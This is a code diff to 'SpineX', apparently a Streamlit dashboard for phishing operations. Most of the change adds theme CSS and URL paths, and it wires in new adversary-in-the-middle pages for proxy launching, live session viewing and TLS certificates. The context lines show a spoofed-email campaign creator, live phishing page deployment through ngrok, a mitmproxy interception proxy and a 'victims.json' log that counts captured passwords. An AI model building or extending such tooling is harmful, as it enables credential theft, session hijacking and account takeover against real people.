@@ -16,6 +16,14 @@ from pyngrok import ngrok
 import requests
 import random
 from threading import Thread
+import sys as _sys
+import os as _os
+_sys.path.insert(0, _os.path.join(_os.path.dirname(_os.path.abspath(__file__)), "aitm"))
+
+import aitm.config_page
+import aitm.cert_page
+import aitm.proxy_page
+import aitm.session_viewer
 
 class ProxyRotator:
     def __init__(self):
@@ -97,6 +105,145 @@ st.markdown("""
     .stTextArea textarea { font-family: 'Courier New', Courier, monospace; color: #00ff41; background-color: #000; }
     </style>
     """, unsafe_allow_html=True)
+
+_THEME_CSS = """
+<style>
+@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Syne:wght@400;700;800&display=swap');
+
+:root {
+    --bg:      #0a0a0f;
+    --surface: #111118;
+    --border:  #1e1e2e;
+    --accent:  #00ff9d;
+    --accent2: #ff3c6e;
+    --accent3: #7c5cff;
+    --text:    #e2e2f0;
+    --muted:   #6b6b8a;
+    --ok:      #00ff9d;
+    --warn:    #ffcc00;
+    --fail:    #ff3c6e;
+}
+
+/* ── Base ── */
+html, body,
+[data-testid="stAppViewContainer"],
+[data-testid="stMain"],
+section.main { background: var(--bg) !important; color: var(--text) !important; }
+
+[data-testid="stSidebar"],
+[data-testid="stSidebarContent"] { background: var(--surface) !important; border-right: 1px solid var(--border); }
+
+/* ── Typography ── */
+h1, h2, h3, h4 { font-family: 'Syne', sans-serif !important; font-weight: 800 !important;
+                  letter-spacing: -0.03em; color: var(--text) !important; }
+p, li, label, span, div { color: var(--text); }
+
+/* ── Metrics ── */
+[data-testid="stMetric"] {
+    background: var(--surface) !important;
+    border: 1px solid var(--border) !important;
+    border-radius: 8px !important;
+    padding: 1rem 1.2rem !important;
+}
+[data-testid="stMetricValue"] { font-family: 'JetBrains Mono', monospace !important;
+                                 color: var(--accent) !important; font-size: 1.6rem !important; }
+[data-testid="stMetricLabel"] { color: var(--muted) !important; font-size: 0.72rem !important;
+                                 text-transform: uppercase; letter-spacing: 0.1em; }
+
+/* ── Buttons ── */
+.stButton > button {
+    background: transparent !important;
+    border: 1px solid var(--accent) !important;
+    color: var(--accent) !important;
+    border-radius: 5px !important;
+    font-family: 'JetBrains Mono', monospace !important;
+    font-weight: 600 !important;
+    letter-spacing: 0.05em;
+    transition: background 0.2s, color 0.2s;
+}
+.stButton > button:hover {
+    background: var(--accent) !important;
+    color: var(--bg) !important;
+}
+.stButton > button[kind="primary"] {
+    background: var(--accent) !important;
+    color: var(--bg) !important;
+}
+.stButton > button[kind="primary"]:hover {
+    background: #00cc7a !important;
+}
+
+/* ── Inputs ── */
+.stTextInput > div > div > input,
+.stNumberInput > div > div > input,
+.stTextArea textarea,
+.stSelectbox > div > div {
+    background: var(--surface) !important;
+    border: 1px solid var(--border) !important;
+    color: var(--text) !important;
+    border-radius: 6px !important;
+    font-family: 'JetBrains Mono', monospace !important;
+}
+.stTextArea textarea { color: #00ff9d !important; }
+
+/* ── Tabs ── */
+.stTabs [data-baseweb="tab-list"] { background: var(--surface) !important;
+                                     border-bottom: 1px solid var(--border) !important; }
+.stTabs [data-baseweb="tab"] { color: var(--muted) !important;
+                                font-family: 'JetBrains Mono', monospace !important;
+                                font-size: 0.82rem !important; font-weight: 600 !important; }
+.stTabs [aria-selected="true"] { color: var(--accent) !important;
+                                  border-bottom: 2px solid var(--accent) !important; }
+.stTabs [data-baseweb="tab-panel"] { background: var(--bg) !important; }
+
+/* ── Info / Warning / Error / Success boxes ── */
+[data-testid="stAlert"] { border-radius: 6px !important; }
+.stAlert[data-baseweb="notification"] { background: var(--surface) !important; }
+
+/* ── Code blocks ── */
+code, pre { font-family: 'JetBrains Mono', monospace !important;
+             background: var(--surface) !important; color: var(--accent) !important;
+             border: 1px solid var(--border) !important; border-radius: 4px; }
+
+/* ── Divider ── */
+hr { border-color: var(--border) !important; }
+
+/* ── Sidebar nav ── */
+[data-testid="stSidebarNav"] a { color: var(--muted) !important;
+                                  font-family: 'Syne', sans-serif !important; }
+[data-testid="stSidebarNav"] a:hover { color: var(--accent) !important; }
+[data-testid="stSidebarNav"] [aria-selected="true"] { color: var(--accent) !important;
+    border-left: 3px solid var(--accent); background: #00ff9d12 !important; }
+
+/* ── Expander ── */
+.streamlit-expanderHeader { background: var(--surface) !important;
+                             border: 1px solid var(--border) !important;
+                             color: var(--text) !important; border-radius: 6px; }
+
+/* ── Dataframe / table ── */
+[data-testid="stDataFrame"] { background: var(--surface) !important; }
+
+/* ── Victim card (legacy) ── */
+.victim-card { background: var(--surface) !important; border: 1px solid var(--border) !important;
+               padding: 20px; border-radius: 10px; }
+
+/* ── Accent header line ── */
+.accent-line { width: 40px; height: 3px; background: var(--accent);
+               border-radius: 2px; margin-bottom: 0.5rem; }
+
+/* ── Badge ── */
+.badge { display: inline-block; padding: 2px 10px; border-radius: 100px;
+         font-family: 'JetBrains Mono', monospace; font-size: 0.72rem;
+         font-weight: 600; letter-spacing: 0.05em; }
+.badge-ok   { background:#00ff9d18; color:var(--ok);  border:1px solid #00ff9d44; }
+.badge-warn { background:#ffcc0018; color:var(--warn); border:1px solid #ffcc0044; }
+.badge-fail { background:#ff3c6e18; color:var(--fail); border:1px solid #ff3c6e44; }
+.badge-info { background:#7c5cff18; color:var(--accent3); border:1px solid #7c5cff44; }
+</style>
+"""
+
+def _apply_theme():
+    st.markdown(_THEME_CSS, unsafe_allow_html=True)
 
 STATE_FILE = "spinex_state.json"
 LOG_FILE = os.path.join("creds", "victims.json")
@@ -331,7 +478,9 @@ def send_email(to_email, subject, body):
         return False
 
 def home():
-    st.title("🕷️ SpineX Operations Dashboard")
+    _apply_theme()
+    st.markdown('<div class="accent-line"></div>', unsafe_allow_html=True)
+    st.markdown("# 🕷️ SpineX Operations Dashboard")
     victims = load_victims()
     total_victims = len(victims)
     successful_logins = sum(1 for v in victims.values() if v.get('new_pass') or v.get('current_pass'))
@@ -387,7 +536,9 @@ def home():
                     st.rerun()
 
 def craft_mail():
-    st.title("📧 Dynamic Campaign Creator")
+    _apply_theme()
+    st.markdown('<div class="accent-line"></div>', unsafe_allow_html=True)
+    st.markdown("# 📧 Dynamic Campaign Creator")
     template_files = [f for f in os.listdir(TEMPLATE_DIR) if f.endswith(".html")]
     if not template_files:
         st.error("No templates found.")
@@ -446,10 +597,12 @@ def craft_mail():
             else:
                 st.warning("Recipient email is required.")
     with t2:
-        st.iframe(final_html, height=600, scrolling=True)
+        st.iframe(final_html, height=600)
 
 def phish_temp():
-    st.title("🎣 Phish Craft & Live Deployment")
+    _apply_theme()
+    st.markdown('<div class="accent-line"></div>', unsafe_allow_html=True)
+    st.markdown("# 🎣 Phish Craft & Live Deployment")
     if 'server_live' not in st.session_state:
         st.session_state['server_live'] = False
     if not os.path.exists(PHISH_TEMPLATE):
@@ -591,7 +744,9 @@ def stop_mitmproxy():
         st.success("mitmproxy stopped.")
 
 def aitm_proxy():
-    st.title("👁️ Adversary-in-the-Middle Proxy")
+    _apply_theme()
+    st.markdown('<div class="accent-line"></div>', unsafe_allow_html=True)
+    st.markdown("# 👁️ Adversary-in-the-Middle Proxy")
 
     if 'mitm_live' not in st.session_state:
         st.session_state['mitm_live'] = False
@@ -740,7 +895,9 @@ def aitm_proxy():
         st.rerun()
 
 def about():
-    st.title("🕸️ About SPINEX Framework")
+    _apply_theme()
+    st.markdown('<div class="accent-line"></div>', unsafe_allow_html=True)
+    st.markdown("# 🕸️ About SPINEX Framework")
     col1, col2 = st.columns([1, 2])
     with col1:
         if os.path.exists("assets/spinex_logo.png"):
@@ -802,12 +959,16 @@ def add_social_links():
     )
 
 pg = st.navigation({
-    "Main": [st.Page(home, title="Dashboard", icon="🖥️")],
+    "Main": [st.Page(home, title="Dashboard", icon="🖥️", url_path="dashboard")],
     "Operations": [
-        st.Page(craft_mail, title="Email Spoofer", icon="📨"),
-        st.Page(phish_temp, title="Phish Template", icon="🎣"),
-        st.Page(aitm_proxy, title="AiTM Proxy", icon="👁️"),
-        st.Page(about, title="About", icon="❔")
+        st.Page(craft_mail,            title="Email Spoofer",    icon="📨", url_path="email-spoofer"),
+        st.Page(phish_temp,            title="Phish Template",   icon="🎣", url_path="phish-template"),
+        st.Page(aitm_proxy,            title="AiTM Proxy",       icon="👁️", url_path="aitm-proxy"),
+        st.Page(aitm.proxy_page.render,     title="Proxy Launcher",   icon="⚡", url_path="proxy-launcher"),
+        st.Page(aitm.session_viewer.render, title="Live Sessions",    icon="🎯", url_path="live-sessions"),
+        st.Page(aitm.config_page.render,    title="AiTM Config",      icon="⚙️", url_path="aitm-config"),
+        st.Page(aitm.cert_page.render,      title="TLS Certificate",  icon="🔒", url_path="tls-cert"),
+        st.Page(about,                 title="About",             icon="❔", url_path="about"),
     ],
 })
 
